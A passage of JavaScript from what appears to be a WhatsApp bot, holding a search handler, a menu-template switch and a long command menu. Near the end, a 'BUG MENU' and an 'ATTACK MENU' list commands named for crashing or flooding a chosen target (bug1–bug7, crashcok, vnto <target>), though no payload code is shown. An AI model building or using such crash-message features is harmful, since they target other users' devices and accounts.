            let capt = `Drakor Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `│➳ Judul: ${i.judul}\n`
            capt += `│➳ Years: ${i.years}\n`
            capt += `│➳ Genre: ${i.genre}\n`
            capt += `│➳ Url: ${i.url}\n`
            capt += `│➳ Thumbnail Url: ${i.thumbnail}\n\n──────────────────────\n`
            }
            hisoka.sendImage(m.chat, res.result[0].thumbnail, capt, m)
            }
            break
            case 'setmenu': {
            if (!isCreator) return
            let setbot = db.data.settings[botNumber]
               if (args[0] === 'templateImage'){
                setbot.templateImage = true
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateVideo'){
                setbot.templateImage = false
                setbot.templateVideo = true
                setbot.templateGif = false
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateGif'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = true
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateMessage'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = true
                m.reply(mess.success)
                } else {
                let sections = [
                {
                title: "CHANGE MENU BOT",
                rows: [
                {title: "Template Image", rowId: `setmenu templateImage`, description: `Change menu bot to Template Image`},
                {title: "Template Video", rowId: `setmenu templateVideo`, description: `Change menu bot to Template Video`},
                {title: "Template Gif", rowId: `setmenu templateGif`, description: `Change menu bot to Template Gif`},
                {title: "Template Message", rowId: `setmenu templateMessage`, description: `Change menu bot to Template Message`}
                ]
                },
                ]
                hisoka.sendListMsg(m.chat, `Please select the menu you want to change!`, hisoka.user.name, `Hello Owner !`, `Click Here`, sections, m)
                }
            }
            break
            case 'list': case 'menu': case 'help': case '?': {
 if (!isCreator) return 
                 anu = `
  ╭━━╮┈┈┈╭━━╮
  ┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
  ╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
  ┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
  ┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
  ╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
  ┃┈┈╰━━━╯┈┈╰━┛┈┃
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
GUNAKAN BOT SEBAIK MUNGKIN
DILARANG SPAM

•━══〘N4NH3R0〙══━• 
╭━═════════════━• 
│  〘 GROUP MENU 〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚕𝚒𝚗𝚔𝚐𝚛𝚘𝚞𝚙
│➳ ${prefix}𝚎𝚙𝚑𝚎𝚖𝚎𝚛𝚊𝚕 [𝚘𝚙𝚝𝚒𝚘𝚗]
│➳ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚐𝚌 [𝚒𝚖𝚊𝚐𝚎]
│➳ ${prefix}𝚜𝚎𝚝𝚗𝚊𝚖𝚎 [𝚝𝚎𝚡𝚝]
│➳ ${prefix}𝚜𝚎𝚝𝚍𝚎𝚜𝚌 [𝚝𝚎𝚡𝚝]
│➳ ${prefix}𝚐𝚛𝚘𝚞𝚙 [𝚘𝚙𝚝𝚒𝚘𝚗]
│➳ ${prefix}𝚎𝚍𝚒𝚝𝚒𝚗𝚏𝚘 [𝚘𝚙𝚝𝚒𝚘𝚗]
│➳ ${prefix}𝚊𝚍𝚍 @𝚞𝚜𝚎𝚛
│➳ ${prefix}𝚔𝚒𝚌𝚔 @𝚞𝚜𝚎𝚛
│➳ ${prefix}𝚑𝚒𝚍𝚎𝚝𝚊𝚐 [𝚝𝚎𝚡𝚝]
│➳ ${prefix}𝚝𝚊𝚐𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
│➳ ${prefix}𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔 [𝚘𝚗/𝚘𝚏𝚏]
│➳ ${prefix}𝚖𝚞𝚝𝚎 [𝚘𝚗/𝚘𝚏𝚏]
│➳ ${prefix}𝚙𝚛𝚘𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
│➳ ${prefix}𝚍𝚎𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
│➳ ${prefix}𝚟𝚘𝚝𝚎 [𝚝𝚎𝚡𝚝]
│➳ ${prefix}𝚍𝚎𝚟𝚘𝚝𝚎
│➳ ${prefix}𝚞𝚙𝚟𝚘𝚝𝚎
│➳ ${prefix}𝚌𝚎𝚔𝚟𝚘𝚝𝚎
│➳ ${prefix}𝚑𝚊𝚙𝚞𝚜𝚟𝚘𝚝𝚎
╰━═════════════━•

╭━═════════════━• 
│ 〘WEBZONE MENU〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚙𝚕𝚊𝚢𝚜𝚝𝚘𝚛𝚎
│➳ ${prefix}𝚐𝚜𝚖𝚊𝚛𝚎𝚗𝚊
│➳ ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚋𝚒𝚘𝚜𝚔𝚘𝚙
│➳ ${prefix}𝚗𝚘𝚠𝚙𝚕𝚊𝚢𝚒𝚗𝚐𝚋𝚒𝚘𝚜𝚔𝚘𝚙
│➳ ${prefix}𝚊𝚖𝚒𝚗𝚒𝚘
│➳ ${prefix}𝚠𝚊𝚝𝚝𝚙𝚊𝚍
│➳ ${prefix}𝚠𝚎𝚋𝚝𝚘𝚘𝚗𝚜
│➳ ${prefix}𝚍𝚛𝚊𝚔𝚘𝚛
╰━═════════════━•

╭━═════════════━• 
│〘DOWNLOAD MENU〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚗𝚘𝚠𝚖 [𝚞𝚛𝚕]
│➳ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚠𝚖 [𝚞𝚛𝚕]
│➳ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚖𝚙3 [𝚞𝚛𝚕]
│➳ ${prefix}𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 [𝚞𝚛𝚕]
│➳ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛 [𝚞𝚛𝚕]
│➳ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛𝚖𝚙3 [𝚞𝚛𝚕]
│➳ ${prefix}𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 [𝚞𝚛𝚕]
│➳ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝𝚍𝚕 [𝚞𝚛𝚕]
│➳ ${prefix}𝚢𝚝𝚖𝚙3 [𝚞𝚛𝚕]
│➳ ${prefix}𝚢𝚝𝚖𝚙4 [𝚞𝚛𝚕]
│➳ ${prefix}𝚐𝚎𝚝𝚖𝚞𝚜𝚒𝚌 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚐𝚎𝚝𝚟𝚒𝚍𝚎𝚘 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚞𝚖𝚖𝚊 [𝚞𝚛𝚕]
│➳ ${prefix}𝚓𝚘𝚘𝚡 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚜𝚘𝚞𝚗𝚍𝚌𝚕𝚘𝚞𝚍 [𝚞𝚛𝚕]
╰━═════════════━•

╭━═════════════━• 
│ 〘 SEARCH MENU 〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚙𝚕𝚊𝚢 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚢𝚝𝚜 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚐𝚘𝚘𝚐𝚕𝚎 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚐𝚒𝚖𝚊𝚐𝚎 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚠𝚊𝚕𝚕𝚙𝚊𝚙𝚎𝚛 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚠𝚒𝚔𝚒𝚖𝚎𝚍𝚒𝚊 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚢𝚝𝚜𝚎𝚊𝚛𝚌𝚑 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚛𝚒𝚗𝚐𝚝𝚘𝚗𝚎 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚜𝚝𝚊𝚕𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗] [𝚚𝚞𝚎𝚛𝚢]
╰━═════════════━•

╭━═════════════━• 
│ 〘 RANDOM MENU 〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚌𝚘𝚏𝚏𝚎
│➳ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚜𝚊𝚗𝚒𝚖𝚎
│➳ ${prefix}𝚖𝚘𝚝𝚒𝚟𝚊𝚜𝚒
│➳ ${prefix}𝚍𝚒𝚕𝚊𝚗𝚚𝚞𝚘𝚝𝚎
│➳ ${prefix}𝚋𝚞𝚌𝚒𝚗𝚚𝚞𝚘𝚝𝚎
│➳ ${prefix}𝚔𝚊𝚝𝚊𝚜𝚎𝚗𝚓𝚊
│➳ ${prefix}𝚙𝚞𝚒𝚜𝚒
│➳ ${prefix}𝚌𝚘𝚞𝚙𝚕𝚎
│➳ ${prefix}𝚊𝚗𝚒𝚖𝚎
│➳ ${prefix}𝚠𝚊𝚒𝚏𝚞
│➳ ${prefix}𝚑𝚞𝚜𝚋𝚞
│➳ ${prefix}𝚗𝚎𝚔𝚘
│➳ ${prefix}𝚜𝚑𝚒𝚗𝚘𝚋𝚞
│➳ ${prefix}𝚠𝚊𝚒𝚏𝚞𝚜 (𝚗𝚜𝚏𝚠)
│➳ ${prefix}𝚗𝚎𝚔𝚘𝚜 (𝚗𝚜𝚏𝚠)
│➳ ${prefix}𝚝𝚛𝚊𝚙 (𝚗𝚜𝚏𝚠)
│➳ ${prefix}𝚋𝚕𝚘𝚠𝚓𝚘𝚋 (𝚗𝚜𝚏𝚠)
╰━═════════════━•

╭━═════════════━• 
│ 〘 TEKS PRO MENU 〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}3𝚍𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜
│➳ ${prefix}3𝚍𝚍𝚎𝚎𝚙𝚜𝚎𝚊
│➳ ${prefix}𝚊𝚖𝚎𝚛𝚒𝚌𝚊𝚗𝚏𝚕𝚊𝚐
│➳ ${prefix}3𝚍𝚜𝚌𝚒𝚏𝚒
│➳ ${prefix}3𝚍𝚛𝚊𝚒𝚗𝚋𝚘𝚠
│➳ ${prefix}3𝚍𝚠𝚊𝚝𝚎𝚛𝚙𝚒𝚙𝚎
│➳ ${prefix}𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗𝚜𝚔𝚎𝚕𝚎𝚝𝚘𝚗
│➳ ${prefix}𝚜𝚔𝚎𝚝𝚌𝚑
│➳ ${prefix}𝚋𝚕𝚞𝚎𝚌𝚒𝚛𝚌𝚞𝚒𝚝
│➳ ${prefix}𝚜𝚙𝚊𝚌𝚎
│➳ ${prefix}𝚖𝚎𝚝𝚊𝚕𝚕𝚒𝚌
│➳ ${prefix}𝚏𝚒𝚌𝚝𝚒𝚘𝚗
│➳ ${prefix}𝚐𝚛𝚎𝚎𝚗𝚑𝚘𝚛𝚛𝚘𝚛
│➳ ${prefix}𝚝𝚛𝚊𝚗𝚜𝚏𝚘𝚛𝚖𝚎𝚛
│➳ ${prefix}𝚋𝚎𝚛𝚛𝚢
│➳ ${prefix}𝚝𝚑𝚞𝚗𝚍𝚎𝚛
│➳ ${prefix}𝚖𝚊𝚐𝚖𝚊
│➳ ${prefix}3𝚍𝚌𝚛𝚊𝚌𝚔𝚎𝚍𝚜𝚝𝚘𝚗𝚎
│➳ ${prefix}3𝚍𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝
│➳ ${prefix}𝚒𝚖𝚙𝚛𝚎𝚜𝚜𝚒𝚟𝚎𝚐𝚕𝚒𝚝𝚌𝚑
│➳ ${prefix}𝚗𝚊𝚝𝚞𝚛𝚊𝚕𝚕𝚎𝚊𝚟𝚎𝚜
│➳ ${prefix}𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎
│➳ ${prefix}𝚖𝚊𝚝𝚛𝚒𝚡
│➳ ${prefix}𝚍𝚛𝚘𝚙𝚠𝚊𝚝𝚎𝚛
│➳ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
│➳ ${prefix}𝚏𝚘𝚐𝚐𝚢𝚠𝚒𝚗𝚍𝚘𝚠
│➳ ${prefix}𝚗𝚎𝚘𝚗𝚍𝚎𝚟𝚒𝚕𝚜
│➳ ${prefix}𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜𝚑𝚘𝚕𝚒𝚍𝚊𝚢
│➳ ${prefix}3𝚍𝚐𝚛𝚊𝚍𝚒𝚎𝚗𝚝
│➳ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
│➳ ${prefix}𝚐𝚕𝚞𝚎𝚝𝚎𝚡𝚝
╰━═════════════━•

╭━═════════════━• 
│〘PHOTO OXY MENU〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚜𝚑𝚊𝚍𝚘𝚠
│➳ ${prefix}𝚛𝚘𝚖𝚊𝚗𝚝𝚒𝚌
│➳ ${prefix}𝚜𝚖𝚘𝚔𝚎
│➳ ${prefix}𝚋𝚞𝚛𝚗𝚙𝚊𝚙𝚙𝚎𝚛
│➳ ${prefix}𝚗𝚊𝚛𝚞𝚝𝚘
│➳ ${prefix}𝚕𝚘𝚟𝚎𝚖𝚜𝚐
│➳ ${prefix}𝚐𝚛𝚊𝚜𝚜𝚖𝚜𝚐
│➳ ${prefix}𝚕𝚘𝚟𝚎𝚝𝚎𝚡𝚝
│➳ ${prefix}𝚌𝚘𝚏𝚏𝚎𝚌𝚞𝚙
│➳ ${prefix}𝚋𝚞𝚝𝚝𝚎𝚛𝚏𝚕𝚢
│➳ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
│➳ ${prefix}𝚛𝚎𝚝𝚛𝚘𝚕𝚘𝚕
╰━═════════════━•

╭━═════════════━• 
│ 〘 EPHOTO MENU 〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚏𝚏𝚌𝚘𝚟𝚎𝚛
│➳ ${prefix}𝚌𝚛𝚘𝚜𝚜𝚏𝚒𝚛𝚎
│➳ ${prefix}𝚐𝚊𝚕𝚊𝚡𝚢
│➳ ${prefix}𝚐𝚕𝚊𝚜𝚜
│➳ ${prefix}𝚗𝚎𝚘𝚗
│➳ ${prefix}𝚋𝚎𝚊𝚌𝚑
│➳ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
│➳ ${prefix}𝚒𝚐𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
│➳ ${prefix}𝚢𝚝𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
╰━═════════════━•

╭━═════════════━• 
│    〘 FUN MENU 〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚜𝚒𝚖𝚒𝚑
│➳ ${prefix}𝚑𝚊𝚕𝚊𝚑
│➳ ${prefix}𝚑𝚒𝚕𝚒𝚑
│➳ ${prefix}𝚑𝚞𝚕𝚞𝚑
│➳ ${prefix}𝚑𝚎𝚕𝚎𝚑
│➳ ${prefix}𝚑𝚘𝚕𝚘𝚑
│➳ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗
│➳ ${prefix}𝚓𝚘𝚍𝚘𝚑𝚔𝚞
│➳ ${prefix}𝚍𝚎𝚕𝚝𝚝𝚝
│➳ ${prefix}𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎
│➳ ${prefix}𝚏𝚊𝚖𝚒𝚕𝚢100
│➳ ${prefix}𝚝𝚎𝚋𝚊𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗]
│➳ ${prefix}𝚖𝚊𝚝𝚑 [𝚖𝚘𝚍𝚎]
│➳ ${prefix}𝚜𝚞𝚒𝚝𝚙𝚟𝚙 [@𝚝𝚊𝚐]
╰━═════════════━•

╭━═════════════━• 
│ 〘 PRIMBON MENU 〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚗𝚘𝚖𝚘𝚛𝚑𝚘𝚔𝚒
│➳ ${prefix}𝚊𝚛𝚝𝚒𝚖𝚒𝚖𝚙𝚒
│➳ ${prefix}𝚊𝚛𝚝𝚒𝚗𝚊𝚖𝚊
│➳ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑
│➳ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑𝚋𝚊𝚕𝚒
│➳ ${prefix}𝚜𝚞𝚊𝚖𝚒𝚒𝚜𝚝𝚛𝚒
│➳ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚌𝚒𝚗𝚝𝚊
│➳ ${prefix}𝚌𝚘𝚌𝚘𝚔𝚗𝚊𝚖𝚊
│➳ ${prefix}𝚙𝚊𝚜𝚊𝚗𝚐𝚊𝚗
│➳ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗𝚗𝚒𝚔𝚊𝚑
│➳ ${prefix}𝚜𝚒𝚏𝚊𝚝𝚞𝚜𝚊𝚑𝚊
│➳ ${prefix}𝚛𝚎𝚣𝚎𝚔𝚒
│➳ ${prefix}𝚙𝚎𝚔𝚎𝚛𝚓𝚊𝚊𝚗
│➳ ${prefix}𝚗𝚊𝚜𝚒𝚋
│➳ ${prefix}𝚙𝚎𝚗𝚢𝚊𝚔𝚒𝚝
│➳ ${prefix}𝚝𝚊𝚛𝚘𝚝
│➳ ${prefix}𝚏𝚎𝚗𝚐𝚜𝚑𝚞𝚒
│➳ ${prefix}𝚑𝚊𝚛𝚒𝚋𝚊𝚒𝚔
│➳ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚊𝚗𝚐𝚊𝚛
│➳ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚒𝚊𝚕
│➳ ${prefix}𝚗𝚊𝚐𝚊𝚑𝚊𝚛𝚒
│➳ ${prefix}𝚊𝚛𝚊𝚑𝚛𝚎𝚣𝚎𝚔𝚒
│➳ ${prefix}𝚙𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
│➳ ${prefix}𝚠𝚎𝚝𝚘𝚗
│➳ ${prefix}𝚔𝚊𝚛𝚊𝚔𝚝𝚎𝚛
│➳ ${prefix}𝚔𝚎𝚋𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
│➳ ${prefix}𝚖𝚎𝚖𝚊𝚗𝚌𝚒𝚗𝚐
│➳ ${prefix}𝚖𝚊𝚜𝚊𝚜𝚞𝚋𝚞𝚛
│➳ ${prefix}𝚣𝚘𝚍𝚒𝚊𝚔
│➳ ${prefix}𝚜𝚑𝚒𝚘
╰━═════════════━•

╭━═════════════━• 
│ 〘 CONVERT MENU 〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚊𝚝𝚝𝚙
│➳ ${prefix}𝚝𝚝𝚙
│➳ ${prefix}𝚝𝚘𝚒𝚖𝚊𝚐𝚎
│➳ ${prefix}𝚛𝚎𝚖𝚘𝚟𝚎𝚋𝚐
│➳ ${prefix}𝚜𝚝𝚒𝚌𝚔𝚎𝚛
│➳ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡
│➳ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡2
│➳ ${prefix}𝚝𝚘𝚟𝚒𝚍𝚎𝚘
│➳ ${prefix}𝚝𝚘𝚐𝚒𝚏
│➳ ${prefix}𝚝𝚘𝚞𝚛𝚕
│➳ ${prefix}𝚝𝚘𝚟𝚗
│➳ ${prefix}𝚝𝚘𝚖𝚙3
│➳ ${prefix}𝚝𝚘𝚊𝚞𝚍𝚒𝚘
│➳ ${prefix}𝚎𝚋𝚒𝚗𝚊𝚛𝚢
│➳ ${prefix}𝚍𝚋𝚒𝚗𝚊𝚛𝚢
│➳ ${prefix}𝚜𝚝𝚢𝚕𝚎𝚝𝚎𝚡𝚝
│➳ ${prefix}𝚜𝚖𝚎𝚖𝚎
╰━═════════════━•

╭━═════════════━• 
│   〘 MAIN MENU 〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚙𝚒𝚗𝚐
│➳ ${prefix}𝚘𝚠𝚗𝚎𝚛
│➳ ${prefix}𝚖𝚎𝚗𝚞 / 𝚑𝚎𝚕𝚙 / ?
│➳ ${prefix}𝚍𝚎𝚕𝚎𝚝𝚎
│➳ ${prefix}𝚒𝚗𝚏𝚘𝚌𝚑𝚊𝚝
│➳ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚍
│➳ ${prefix}𝚕𝚒𝚜𝚝𝚙𝚌
│➳ ${prefix}𝚕𝚒𝚜𝚝𝚐𝚌
│➳ ${prefix}𝚕𝚒𝚜𝚝𝚘𝚗𝚕𝚒𝚗𝚎
│➳ ${prefix}𝚜𝚙𝚎𝚎𝚍𝚝𝚎𝚜𝚝
╰━═════════════━•

╭━═════════════━• 
│〘 DATABASE MENU 〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚜𝚎𝚝𝚌𝚖𝚍
│➳ ${prefix}𝚕𝚒𝚜𝚝𝚌𝚖𝚍
│➳ ${prefix}𝚍𝚎𝚕𝚌𝚖𝚍
│➳ ${prefix}𝚕𝚘𝚌𝚔𝚌𝚖𝚍
│➳ ${prefix}𝚊𝚍𝚍𝚖𝚜𝚐
│➳ ${prefix}𝚕𝚒𝚜𝚝𝚖𝚜𝚐
│➳ ${prefix}𝚐𝚎𝚝𝚖𝚜𝚐
│➳ ${prefix}𝚍𝚎𝚕𝚖𝚜𝚐
╰━═════════════━•

╭━═════════════━• 
│〘ANONYMOUS MENU〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜
│➳ ${prefix}𝚜𝚝𝚊𝚛𝚝
│➳ ${prefix}𝚗𝚎𝚡𝚝
│➳ ${prefix}𝚔𝚎𝚕𝚞𝚊𝚛
╰━═════════════━•

╭━═════════════━• 
│  〘 ISLAMIC MENU 〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚒𝚚𝚛𝚊
│➳ ${prefix}𝚑𝚊𝚍𝚒𝚜𝚝
│➳ ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗
│➳ ${prefix}𝚓𝚞𝚣𝚊𝚖𝚖𝚊
│➳ ${prefix}𝚝𝚊𝚏𝚜𝚒𝚛𝚜𝚞𝚛𝚊𝚑
╰━═════════════━•

╭━═════════════━• 
│  〘 VOICE MENU 〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚋𝚊𝚜𝚜
│➳ ${prefix}𝚋𝚕𝚘𝚠𝚗
│➳ ${prefix}𝚍𝚎𝚎𝚙
│➳ ${prefix}𝚎𝚊𝚛𝚛𝚊𝚙𝚎
│➳ ${prefix}𝚏𝚊𝚜𝚝
│➳ ${prefix}𝚏𝚊𝚝
│➳ ${prefix}𝚗𝚒𝚐𝚑𝚝𝚌𝚘𝚛𝚎
│➳ ${prefix}𝚛𝚎𝚟𝚎𝚛𝚜𝚎
│➳ ${prefix}𝚛𝚘𝚋𝚘𝚝
│➳ ${prefix}𝚜𝚕𝚘𝚠
│➳ ${prefix}𝚝𝚞𝚙𝚊𝚒
│➳ ${prefix}𝚕𝚞𝚜𝚒𝚊𝚙𝚊
╰━═════════════━•

╭━═════════════━• 
│ 〘 OWNER MENU 〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚛𝚎𝚊𝚌𝚝 [𝚎𝚖𝚘𝚓𝚒]
│➳ ${prefix}𝚌𝚑𝚊𝚝 [𝚘𝚙𝚝𝚒𝚘𝚗]
│➳ ${prefix}𝚓𝚘𝚒𝚗 [𝚕𝚒𝚗𝚔]
│➳ ${prefix}𝚕𝚎𝚊𝚟𝚎
│➳ ${prefix}𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
│➳ ${prefix}𝚞𝚗𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
│➳ ${prefix}𝚋𝚌𝚐𝚛𝚘𝚞𝚙 [𝚝𝚎𝚡𝚝]
│➳ ${prefix}𝚋𝚌𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
│➳ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚋𝚘𝚝 [𝚒𝚖𝚊𝚐𝚎]
│➳ ${prefix}𝚜𝚎𝚝𝚎𝚡𝚒𝚏
│➳ ${prefix}𝚜𝚎𝚝𝚖𝚎𝚗𝚞 [𝚘𝚙𝚝𝚒𝚘𝚗]
╰━═════════════━•

╭━═════════════━• 
│    〘 BUG MENU 〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚑𝚒𝚑𝚒
│➳ ${prefix}𝚢𝚞𝚑𝚞
│➳ ${prefix}𝚖𝚘𝚖𝚘
│➳ ${prefix}𝚑𝚎𝚕𝚕𝚘
│➳ ${prefix}𝚜𝚊𝚗𝚝𝚎𝚝
│➳ ${prefix}𝚜𝚕𝚎𝚋𝚎𝚠
│➳ ${prefix}𝚒𝚗𝚏𝚒𝚗𝚒𝚝𝚎
│➳ ${prefix}𝚛𝚎𝚊𝚔𝚜𝚒𝚙𝚌
│➳ ${prefix}𝚛𝚎𝚊𝚔𝚜𝚒𝚐𝚌
│➳ ${prefix}𝚝𝚎𝚗𝚐𝚔𝚘𝚛𝚊𝚔
│➳ ${prefix}𝚍𝚘𝚌 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚋𝚞𝚐1 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚋𝚞𝚐2 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚋𝚞𝚐3 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚋𝚞𝚐4 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚋𝚞𝚐5 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚋𝚞𝚐6 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚋𝚞𝚐7 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚏𝚘𝚞𝚛 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚝𝚛𝚘𝚕𝚒 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚋𝚞𝚐𝚟𝚗 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚋𝚞𝚐𝚍𝚘𝚌 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚔𝚘𝚗𝚝𝚘𝚕 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚔𝚞𝚗𝚝𝚞𝚕 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚕𝚒𝚟𝚎𝚕𝚘𝚌 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚋𝚞𝚐𝚕𝚒𝚜𝚝 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚝𝚊𝚐𝚠𝚊𝚎 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚌𝚊𝚝𝚊𝚕𝚘𝚐 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚋𝚞𝚐𝚜𝚝𝚒𝚔 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚝𝚑𝚎𝚏𝚘𝚞𝚛 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚌𝚛𝚊𝚜𝚑𝚌𝚘𝚔 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚋𝚞𝚐𝚋𝚞𝚝𝚝𝚘𝚗 (𝚓𝚞𝚖𝚕𝚊𝚑)
│➳ ${prefix}𝚋𝚞𝚝𝚝𝚘𝚗𝚏𝚘𝚞𝚛 (𝚓𝚞𝚖𝚕𝚊𝚑)
╰━═════════════━•

╭━═════════════━• 
│  〘 ATTACK MENU 〙
╰━═════════════━• 
╭━═════════════━•
│➳ ${prefix}𝚟𝚗𝚝𝚘 <𝚝𝚊𝚛𝚐𝚎𝚝> 
│➳ ${prefix}but𝚝𝚘 <𝚝𝚊𝚛𝚐𝚎𝚝> 
│➳ ${prefix}𝚖𝚘𝚖𝚘𝚝𝚘 <𝚝𝚊𝚛𝚐𝚎𝚝> 
│➳ ${prefix}𝚜𝚝𝚒𝚔𝚝𝚘 <𝚝𝚊𝚛𝚐𝚎𝚝> 
│➳ ${prefix}𝚑𝚎𝚕𝚕𝚘𝚝𝚘 <𝚝𝚊𝚛𝚐𝚎𝚝>
